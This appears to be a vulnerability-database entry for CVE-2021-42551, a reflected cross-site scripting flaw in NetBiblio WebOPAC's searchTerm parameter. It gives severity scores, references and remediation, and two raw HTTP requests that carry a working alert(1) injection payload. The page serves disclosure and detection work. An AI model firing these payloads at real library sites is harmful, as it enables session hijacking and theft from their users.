---
layout: post
cve_id: CVE-2021-42551
title: NetBiblio WebOPAC - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2021/CVE-2021-42551.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-42551.yaml
snort2_rule: N/A
snort3_rule: N/A
author: compr00t
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary JavaScript code in the context of the victim''s browser, leading
  to session hijacking, defacement, or theft of sensitive information.

  '
remediation: 'Upgrade to the latest version to mitigate this vulnerability.

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2021-42551
- https://www.redguard.ch/advisories/netbiblio_webopac.txt
- https://github.com/ARPSyndicate/cvemon
- https://github.com/ARPSyndicate/kenzer-templates
- https://github.com/compr00t/nuclei-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2021-42551
  cwe-id: CWE-79
  epss-score: 0.09561
  epss-percentile: 0.92603
  cpe: cpe:2.3:a:alcoda:netbiblio:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: alcoda
  product: netbiblio
tags:
- cve2021
- cve
- xss
- netbiblio
- alcoda
- vuln
---

## üîç Vulnerability Description
NetBiblio WebOPAC before 4.0.0.320 is affected by a reflected cross-site scripting vulnerability in its Wikipedia module through /NetBiblio/search/shortview via the searchTerm parameter.

## üåê HTTP Request
```nohighlight
GET /NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%27%2Balert%281%29%2B%27x HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%5C%27%2Balert%281%29%2C%2F%2F HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

